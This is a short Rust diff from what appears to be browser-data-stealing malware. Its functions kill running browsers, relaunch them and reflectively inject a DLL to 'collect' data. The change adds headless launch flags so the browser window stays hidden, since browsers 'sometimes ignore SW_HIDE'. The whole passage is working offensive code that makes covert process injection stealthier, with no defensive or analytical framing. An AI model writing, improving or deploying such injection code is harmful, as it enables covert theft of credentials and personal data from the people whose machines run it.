@@ -242,7 +242,9 @@ unsafe fn inject_dll_reflective(h_process: HANDLE, dll_bytes: &[u8]) {
 fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) {
     println!("\n--- Processing Browser: {} ---", browser_config.name);
 
-    let mut cmd_line: Vec<u16> = OsStr::new(browser_config.exe_name).encode_wide().chain(Some(0)).collect();
+    // Modern browsers sometimes ignore SW_HIDE, so we use --headless and --disable-gpu flags.
+    let cmd_str = format!("{} --headless --disable-gpu", browser_config.exe_name);
+    let mut cmd_line: Vec<u16> = OsStr::new(&cmd_str).encode_wide().chain(Some(0)).collect();
 
     unsafe {
         kill_processes_by_name(browser_config.exe_name);
@@ -269,11 +271,12 @@ fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) {
 
         if success == 0 {
             if let Some(path) = find_browser_exe(browser_config.name) {
-                let full_path_wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(Some(0)).collect();
-                let mut cmd_full = full_path_wide.clone();
+                let cmd_full_str = format!("\"{}\" --headless --disable-gpu", path);
+                let mut cmd_full_wide: Vec<u16> = OsStr::new(&cmd_full_str).encode_wide().chain(Some(0)).collect();
+
                 success = CreateProcessW(
-                    full_path_wide.as_ptr(),
-                    cmd_full.as_mut_ptr(),
+                    ptr::null(),
+                    cmd_full_wide.as_mut_ptr(),
                     ptr::null_mut(),
                     ptr::null_mut(),
                     0,
